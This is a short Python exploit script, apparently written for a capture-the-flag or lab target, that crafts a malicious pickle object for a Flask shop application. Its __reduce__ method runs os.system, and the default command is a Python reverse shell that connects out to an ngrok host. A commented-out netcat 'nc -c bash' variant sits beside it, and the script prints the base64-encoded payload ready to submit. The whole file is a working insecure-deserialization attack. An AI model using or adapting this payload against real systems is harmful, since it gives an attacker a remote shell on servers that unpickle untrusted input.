import base64
import pickle
import sys

from flask import Flask

application = Flask(__name__)

# DEFAULT_COMMAND = "nc -c bash 0.tcp.ap.ngrok.io 14576"
DEFAULT_COMMAND = """python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("0.tcp.ap.ngrok.io",14576));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'"""
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

pickle_obj = "gASVpAAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwHcHJvZHVjdJSMC0Jhc2ljIFNoaXJ0lIwEZGVzY5SMI0dldCBvdXIgbmV3IEJhc2ljIFdvcmxkIFRvdXIgOSBUZWUhlIwFaW1hZ2WUjB4vc3RhdGljL2ltYWdlcy9iYXNpY19zaGlydC5wbmeUjAVwcmljZZSMAjQwlHViLg=="


class PickleRce(object):
    def __reduce__(self):
        import os

        return (os.system, (COMMAND,))


# print(pickle.loads(base64.urlsafe_b64decode(pickle_obj)))
print(base64.urlsafe_b64encode(pickle.dumps(PickleRce())))
